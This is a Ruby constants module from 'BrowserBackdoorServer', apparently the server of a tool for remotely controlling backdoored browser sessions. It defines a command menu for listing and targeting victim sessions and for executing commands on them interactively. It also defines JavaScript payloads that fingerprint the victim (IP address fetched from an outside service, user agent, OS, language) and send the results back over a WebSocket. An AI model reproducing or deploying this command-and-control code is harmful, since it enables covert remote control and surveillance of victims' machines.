#
# Copyright (c) 2016 IMcPwn  - http://imcpwn.com
# BrowserBackdoorServer by IMcPwn.
# See the file 'LICENSE' for copying permission
#

module Bbs

module Constants
    @welcomeMessage = ""\
    " ____                                  ____             _       _                  \n"\
    "| __ ) _ __ _____      _____  ___ _ __| __ )  __ _  ___| | ____| | ___   ___  _ __\n"\
    "|  _ \\| '__/ _ \\ \\ /\\ / / __|/ _ | '__|  _ \\ / _` |/ __| |/ / _` |/ _ \\ / _ \\| '__|\n"\
    "| |_) | | | (_) \\ V  V /\\__ |  __| |  | |_) | (_| | (__|   | (_| | (_) | (_) | |\n"\
    "|____/|_|  \\___/ \\_/\\_/ |___/\\___|_|  |____/ \\__,_|\\___|_|\\_\\__,_|\\___/ \\___/|_|\n"\
    "Visit http://imcpwn.com for more information.\n"
    @commands = {
        "help" => "Help menu",
        "exit" => "Quit the application",
        "sessions" => "List active sessions",
        "target" => "Select targeted session",
        "info" => "Get session information (IP, User Agent, Operating System, Language)",
        "exec" => "Execute commands on the targeted session interactively. Provide an argument to execute a file's contents.",
        "get_cert" => "Get a free TLS certificate from LetsEncrypt",
        "pry" => "Drop into a Pry session",
        "clear" => "Clear the console screen",
        "ls" => "List directory contents",
        "cat" => "Read the contents of a file"
    }.sort
    @infoCommands = {
        "IP" => "var xhttp = new XMLHttpRequest();xhttp.onreadystatechange = function() 
        { if (xhttp.readyState == 4 && xhttp.status == 200) { ws.send(\"IP Address: \" + xhttp.responseText); }};
        xhttp.open(\"GET\", \"https://ipv4.icanhazip.com/\", true);xhttp.send();",
        "USER_AGENT" => "ws.send(\"User agent: \" + navigator.appVersion);",
        "OPERATING_SYSTEM" => "ws.send(\"OS: \" + navigator.platform);",
        "LANGUAGE" => "ws.send(\"Language: \" + navigator.language);"
    }.sort
    def Constants.getWelcomeMessage()
        return @welcomeMessage
    end
    def Constants.getCommands()
        return @commands
    end
    def Constants.getInfoCommands()
        return @infoCommands
    end

end

end

